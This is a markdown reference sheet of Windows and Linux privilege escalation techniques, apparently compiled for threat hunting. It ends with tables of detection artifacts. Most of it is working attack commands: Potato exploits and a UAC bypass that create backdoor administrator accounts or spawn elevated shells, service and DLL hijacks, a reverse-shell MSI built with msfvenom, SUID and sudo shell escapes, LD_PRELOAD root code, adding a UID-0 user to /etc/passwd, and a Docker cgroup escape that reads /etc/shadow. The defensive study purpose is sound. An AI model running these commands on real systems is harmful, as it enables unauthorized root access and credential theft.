# Privilege Escalation — Offensive Techniques & Commands

> Sources: RTFM v3, GTFOBins, LOLBAS, PayloadsAllTheThings, HackTricks
> Purpose: Know what attackers run so you know what to hunt for in logs and artifacts.

---

## Windows Privilege Escalation

### Token Manipulation & Impersonation

```powershell
# Check current privileges
whoami /priv

# SeImpersonatePrivilege abuse (Potato attacks)
# If SeImpersonatePrivilege is enabled (common on service accounts, IIS, MSSQL):
# JuicyPotato, PrintSpoofer, GodPotato, SweetPotato
.\PrintSpoofer.exe -i -c "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add"
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Pass123! /add" -t *

# SeDebugPrivilege — migrate into SYSTEM process
# (Typically done via Meterpreter/Cobalt Strike migrate command)

# Token stealing with incognito (Meterpreter)
# list_tokens -u
# impersonate_token "DOMAIN\\Admin"
```

```cmd
:: Check current user context and privileges
whoami /all
whoami /priv

:: If SeBackupPrivilege — can read any file
robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM SECURITY
```

### Unquoted Service Paths

```powershell
# Find unquoted service paths (classic privesc)
Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -notmatch '^"' -and $_.PathName -match '\s' -and $_.StartMode -ne 'Disabled'
} | Select-Object Name, PathName, StartMode, State

# Exploit: place binary in the space-split path
# If path is: C:\Program Files\My App\service.exe
# Place binary at: C:\Program.exe or C:\Program Files\My.exe
```

```cmd
:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### Weak Service Permissions

```powershell
# Check service permissions (requires accesschk from Sysinternals or similar)
# Get-Acl on service registry keys
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object {
  $acl = Get-Acl $_.PSPath
  $access = $acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone|Authenticated' -and $_.RegistryRights -match 'FullControl|SetValue' }
  if ($access) { [PSCustomObject]@{Service=$_.PSChildName; Identity=$access.IdentityReference; Rights=$access.RegistryRights} }
}

# Modify service binary path (if writable)
sc.exe config <servicename> binpath= "C:\temp\payload.exe"
sc.exe stop <servicename>
sc.exe start <servicename>
```

### DLL Hijacking

```powershell
# Find processes loading DLLs from writable paths
# Process Monitor (procmon) filter: Result=NAME NOT FOUND, Path ends with .dll
# Or check writable directories in PATH:
$env:PATH -split ';' | ForEach-Object {
  if (Test-Path $_) {
    $acl = Get-Acl $_
    $writable = $acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.FileSystemRights -match 'Write|FullControl' }
    if ($writable) { Write-Host "WRITABLE: $_" }
  }
}

# Common hijackable DLLs: version.dll, winmm.dll, dbghelp.dll, wer.dll
# Place malicious DLL in application directory (same name as missing DLL)
```

### AlwaysInstallElevated

```powershell
# Check if AlwaysInstallElevated is set (allows MSI as SYSTEM)
$hklm = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -EA 0
$hkcu = Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -EA 0
if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
  Write-Host "VULNERABLE: AlwaysInstallElevated is enabled"
}

# Exploit: create malicious MSI
# msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi > shell.msi
# msiexec /quiet /qn /i shell.msi
```

```cmd
:: Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

### Stored Credentials & Autologon

```powershell
# Saved credentials
cmdkey /list

# Run command as saved credential
runas /savecred /user:<domain>\<user> cmd.exe

# Autologon credentials in registry
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
  Select-Object DefaultUserName, DefaultPassword, DefaultDomainName, AutoAdminLogon

# Unattend.xml credentials
Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,unattended.xml -Recurse -Force -EA 0 |
  ForEach-Object { Select-String -Path $_ -Pattern "Password|UserName" }

# Group Policy Preferences (cpassword)
Get-ChildItem "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Include Groups.xml,Services.xml,Scheduledtasks.xml,DataSources.xml,Printers.xml,Drives.xml -EA 0 |
  ForEach-Object { Select-String -Path $_ -Pattern "cpassword" }
```

### UAC Bypass

```powershell
# Check UAC settings
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |
  Select-Object EnableLUA, ConsentPromptBehaviorAdmin, LocalAccountTokenFilterPolicy

# Common UAC bypass techniques:
# fodhelper.exe — auto-elevates, reads HKCU registry
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process fodhelper.exe

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# eventvwr.exe bypass (similar)
# computerdefaults.exe bypass
# sdclt.exe bypass
```

### Kernel Exploits

```cmd
:: Check system info for known vulnerable builds
systeminfo
:: Compare against: https://github.com/SecWiki/windows-kernel-exploits
:: Common: MS16-032, MS17-010 (EternalBlue), PrintNightmare (CVE-2021-1675)
```

---

## Linux Privilege Escalation

### SUID/SGID Abuse

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries  
find / -perm -2000 -type f 2>/dev/null

# Check GTFOBins for exploitable SUID binaries
# Common: find, vim, nmap, python, perl, ruby, bash, env, awk, less, more, cp, mv

# SUID exploitation examples:
# find with SUID
find . -exec /bin/sh -p \; -quit

# python with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim with SUID
vim -c ':!/bin/sh'

# nmap (old versions with --interactive)
nmap --interactive
!sh

# env with SUID
env /bin/sh -p

# cp with SUID (overwrite /etc/passwd)
echo 'root2:$1$xyz$hash:0:0:root:/root:/bin/bash' > /tmp/passwd_line
cp /etc/passwd /tmp/passwd.bak
# Append to passwd or overwrite shadow
```

### Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \; -quit

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/sh")'

# (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/shadow
!/bin/sh

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/sh

# (ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/sh";'

# (ALL) NOPASSWD: /usr/bin/ruby
sudo ruby -e 'exec "/bin/sh"'

# (ALL) NOPASSWD: /usr/bin/man
sudo man man
!/bin/sh

# (ALL) NOPASSWD: /usr/bin/nmap
# Old: sudo nmap --interactive; then !sh
# New: echo 'os.execute("/bin/sh")' > /tmp/x.nse && sudo nmap --script=/tmp/x.nse

# LD_PRELOAD exploit (if env_keep+=LD_PRELOAD in sudoers)
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>

# Sudo CVEs: CVE-2021-3156 (Baron Samedit), CVE-2019-14287 (sudo -u#-1)
sudo -u#-1 /bin/bash  # CVE-2019-14287 (sudo < 1.8.28)
```

### Writable /etc/passwd or /etc/shadow

```bash
# Check permissions
ls -la /etc/passwd /etc/shadow

# If /etc/passwd is writable — add root-level user
echo 'hacker:$(openssl passwd -1 password123):0:0:root:/root:/bin/bash' >> /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz password123
# Or: python3 -c "import crypt; print(crypt.crypt('password123', '\$6\$salt\$'))"
```

### Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid+ep on python/perl/node
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_read_search (read any file)
# cap_net_raw (packet capture / spoofing)
# cap_sys_admin (mount, BPF, etc.)
```

### Cron Job Exploitation

```bash
# Find world-writable scripts called by cron
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# Check if cron scripts are writable
find /etc/cron* -type f -writable 2>/dev/null
find /var/spool/cron -type f -readable 2>/dev/null

# Writable PATH directories in cron
# If cron uses PATH=/usr/local/sbin:... and /usr/local/sbin is writable:
echo '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /usr/local/sbin/<script_name>
chmod +x /usr/local/sbin/<script_name>
# Wait for cron; then: /tmp/bash -p

# Wildcard injection (tar in cron: tar cf backup.tar *)
echo "" > "/path/--checkpoint=1"
echo "" > "/path/--checkpoint-action=exec=sh shell.sh"
```

### Kernel Exploits

```bash
# Check kernel version
uname -r
cat /etc/os-release

# Common Linux kernel exploits:
# DirtyPipe (CVE-2022-0847) — kernel 5.8+
# DirtyCow (CVE-2016-5195) — kernel 2.6.22 to 4.8.3
# PwnKit (CVE-2021-4034) — pkexec polkit
# Netfilter (CVE-2022-25636) — kernel 5.4+
# OverlayFS (CVE-2021-3493) — Ubuntu specific

# Compile and run (example):
gcc -o exploit exploit.c
./exploit
```

### Docker Escape

```bash
# Check if in Docker
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# If Docker socket is mounted
docker run -v /:/host -it alpine chroot /host /bin/sh

# If privileged container
mount /dev/sda1 /mnt
chroot /mnt

# Docker group membership (host user in docker group)
docker run -v /:/host -it alpine chroot /host /bin/sh

# Cap_sys_admin in container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > /tmp/cgrp/output" >> /cmd
chmod +x /cmd
echo "/cmd" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### NFS Root Squashing Disabled

```bash
# Check NFS exports on target
showmount -e <target>
cat /etc/exports

# If no_root_squash is set:
# Mount from attacker machine as root, create SUID binary
mount -t nfs <target>:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
# On target: /share/bash -p
```

---

## Detection Signatures

### What to hunt for (Windows)

| Technique | Artifacts |
|-----------|-----------|
| Potato attacks | SeImpersonatePrivilege + new process as SYSTEM, named pipe creation |
| Unquoted service path | Executables in unusual paths matching service path splits |
| Service binary replacement | Service ImagePath changes (Event 7040), new service installs (7045) |
| DLL hijacking | DLLs in user-writable directories, Process Monitor NAME NOT FOUND |
| AlwaysInstallElevated | MSI execution, msiexec.exe spawning shells |
| UAC bypass | fodhelper/eventvwr/sdclt spawning child processes, registry key creation in HKCU\Software\Classes |
| Token manipulation | Unusual parent-child relationships, process running as SYSTEM from user context |

### What to hunt for (Linux)

| Technique | Artifacts |
|-----------|-----------|
| SUID abuse | Unexpected SUID binaries, shell spawned from SUID process |
| Sudo exploitation | `sudo -l` output in history, LD_PRELOAD in environment, unusual sudo commands in auth.log |
| Writable passwd/shadow | Changes to /etc/passwd modification time, new UID 0 accounts |
| Capabilities abuse | `getcap` output, processes with cap_setuid |
| Cron exploitation | Modified cron scripts, new files in cron directories, wildcard injection artifacts |
| Container escape | Docker socket access, mount commands, chroot into /host |
| Kernel exploits | Compilation artifacts (gcc), exploit binaries in /tmp, segfaults in dmesg |
